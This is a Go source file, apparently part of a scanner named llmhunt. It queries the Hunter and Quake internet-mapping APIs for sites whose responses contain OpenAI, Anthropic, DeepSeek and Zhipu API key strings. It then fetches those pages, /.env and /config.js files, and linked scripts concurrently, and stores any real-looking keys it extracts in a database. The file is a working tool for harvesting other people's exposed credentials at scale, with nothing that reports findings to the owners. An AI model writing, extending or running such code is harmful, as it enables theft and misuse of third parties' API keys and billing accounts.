package llmhunt

import (
	"context"
	"fmt"
	"net/url"
	"strings"
	"sync"
	"time"
)

// 泄漏文件狩猎：不猜路径，直接问空间测绘"哪些 URL 的响应体里有 key"。
//
// 性能策略：跨主机**并发**（默认 8 路），不再为每个 URL 睡 2 秒；但同一台主机仍然
// 串行 + 最小间隔 —— 那是防止把单个站点打死的底线，不是可有可无的礼貌。
// 命中 429/403 立即放弃该主机。

const (
	leakPerQuery  = 10
	leakMaxURL    = 150
	leakBodyLimit = 512 * 1024
	leakWorkers   = 8
	// leakPerHostGap 是同一主机两次请求之间的最小间隔（不同主机之间不等待）。
	leakPerHostGap = 250 * time.Millisecond
	// leakMaxScripts 是每个泄漏页面上再跟进的同源脚本数：key 常在内联的 JS 里。
	leakMaxScripts = 2
)

// leakQuery 是一条"找泄漏"的查询。
type leakQuery struct {
	query string
	label string
}

var hunterLeakQueries = []leakQuery{
	{`web.body="OPENAI_API_KEY"`, "OpenAI key 赋值"},
	{`web.body="sk-proj-"`, "OpenAI 新式 key"},
	{`web.body="ANTHROPIC_API_KEY"`, "Anthropic key 赋值"},
	{`web.body="DEEPSEEK_API_KEY"`, "DeepSeek key 赋值"},
	{`web.body="ZHIPUAI_API_KEY"`, "智谱 GLM key 赋值"},
	{`web.body="api.openai.com/v1/chat/completions"`, "OpenAI 调用点"},
}

var quakeLeakQueries = []leakQuery{
	{`body="OPENAI_API_KEY"`, "OpenAI key 赋值"},
	{`body="ANTHROPIC_API_KEY"`, "Anthropic key 赋值"},
	{`body="sk-proj-"`, "OpenAI 新式 key"},
}

// leakConfigPaths 是 Quake 命中后值得一试的配置路径（每台 2 个，够用且不吵）。
var leakConfigPaths = []string{"/.env", "/config.js"}

// huntLeaks 收集候选 URL 后并发抓取，返回 (抓取数, 新增 key 数)。
func (s *Scanner) huntLeaks(ctx context.Context) (int, int) {
	k := loadProviderKeys()
	if k.Hunter == "" && k.Quake == "" {
		s.logf("未配置 Hunter/Quake key，跳过泄漏文件狩猎")
		return 0, 0
	}

	// ① 先把候选 URL 全收集出来（这一步很快：只打测绘 API）
	cands := make([]string, 0, leakMaxURL)
	seen := map[string]bool{}
	add := func(u string) {
		if u == "" || seen[u] || len(cands) >= leakMaxURL {
			return
		}
		seen[u] = true
		cands = append(cands, u)
	}

	if k.Hunter != "" {
		for _, lq := range hunterLeakQueries {
			if ctx.Err() != nil {
				break
			}
			for _, u := range hunterLeakURLs(ctx, k.Hunter, lq.query, leakPerQuery) {
				add(u)
			}
		}
	}
	if k.Quake != "" && len(cands) < leakMaxURL {
		for _, lq := range quakeLeakQueries {
			if ctx.Err() != nil {
				break
			}
			for _, hp := range quakeSearch(ctx, k.Quake, lq.query, leakPerQuery) {
				for _, p := range leakConfigPaths {
					add(fmt.Sprintf("http://%s:%d%s", hp.host, hp.port, p))
				}
			}
		}
	}
	if len(cands) == 0 {
		s.logf("泄漏狩猎：测绘未返回候选 URL")
		return 0, 0
	}
	s.logf("泄漏狩猎：%d 个候选 URL，开始并发抓取（%d 路）", len(cands), leakWorkers)

	// ② 并发抓取：跨主机并行，同主机串行 + 最小间隔
	var (
		mu        sync.Mutex
		hostLock  = map[string]*sync.Mutex{}
		hostLast  = map[string]time.Time{}
		fetched   int
		found     int
		wg        sync.WaitGroup
		sem       = make(chan struct{}, leakWorkers)
		hostGuard = func(host string) {
			mu.Lock()
			l, ok := hostLock[host]
			if !ok {
				l = &sync.Mutex{}
				hostLock[host] = l
			}
			mu.Unlock()
			l.Lock()
			mu.Lock()
			if t, ok := hostLast[host]; ok {
				if d := leakPerHostGap - time.Since(t); d > 0 {
					mu.Unlock()
					time.Sleep(d)
					mu.Lock()
				}
			}
			hostLast[host] = time.Now()
			mu.Unlock()
		}
		hostUnlock = func(host string) {
			mu.Lock()
			if l, ok := hostLock[host]; ok {
				l.Unlock()
			}
			mu.Unlock()
		}
	)

	for _, u := range cands {
		if ctx.Err() != nil {
			break
		}
		sem <- struct{}{}
		wg.Add(1)
		go func(raw string) {
			defer wg.Done()
			defer func() { <-sem }()
			host := hostOf(raw)
			hostGuard(host)
			defer hostUnlock(host)

			st, body, _ := s.get(ctx, raw, leakBodyLimit)
			mu.Lock()
			fetched++
			mu.Unlock()
			if st == 403 || st == 418 || st == 429 {
				return // 站点在拒绝：这台不再碰
			}
			if st != 200 || body == "" {
				return
			}
			n := s.extractKeysFrom(raw, body, "leak-url")
			// 首页里 key 往往在它引用的 JS 里：跟进同源脚本。
			// 注意：此时已经持有 host 的锁（defer hostUnlock），不能再 hostGuard——
			// 同一个 mutex 重入会自锁死（线上踩过：整轮狩猎永久卡住、Stop 也停不掉）。
			for _, js := range scriptSources(body, raw, leakMaxScripts) {
				st2, b2, _ := s.get(ctx, js, leakBodyLimit)
				if st2 == 200 && b2 != "" {
					n += s.extractKeysFrom(js, b2, "leak-js")
				}
			}
			if n > 0 {
				mu.Lock()
				found += n
				mu.Unlock()
			}
		}(u)
	}
	wg.Wait()
	return fetched, found
}

// hostOf 取 URL 的主机（没有端口），用于同一主机的串行保护。
func hostOf(raw string) string {
	u, err := url.Parse(raw)
	if err != nil {
		return raw
	}
	return u.Hostname()
}

// hunterLeakURLs 跑一条 Hunter 查询，取出结果里的 URL。
func hunterLeakURLs(ctx context.Context, key, query string, size int) []string {
	pageSize := 10
	if size > 10 {
		pageSize = 20
	}
	search := b64(query)
	u := fmt.Sprintf("https://hunter.qianxin.com/openApi/search?api-key=%s&search=%s&page=1&page_size=%d&is_web=3",
		url.QueryEscape(key), url.QueryEscape(search), pageSize)
	body, err := httpGetJSON(ctx, u, nil)
	if err != nil {
		return nil
	}
	var v struct {
		Code int `json:"code"`
		Data struct {
			Arr []struct {
				URL string `json:"url"`
			} `json:"arr"`
		} `json:"data"`
	}
	if jsonUnmarshal(body, &v) != nil || v.Code != 200 {
		return nil
	}
	var out []string
	for _, a := range v.Data.Arr {
		if strings.HasPrefix(a.URL, "http") {
			out = append(out, a.URL)
			if len(out) >= size {
				break
			}
		}
	}
	return out
}

// extractKeysFrom 从任意 URL 的响应体里提 key，并标来源。
func (s *Scanner) extractKeysFrom(srcURL, body, sourceKind string) int {
	n := 0
	for _, kp := range keyPatterns {
		for _, m := range kp.re.FindAllString(body, 20) {
			if !looksLikeRealKey(m) {
				continue
			}
			if ok, _ := s.pgKeyInsert(srcURL, kp.name, m, sourceKind); ok {
				n++
			}
		}
	}
	if n > 0 {
		s.mu.Lock()
		s.keys += n
		s.mu.Unlock()
	}
	return n
}
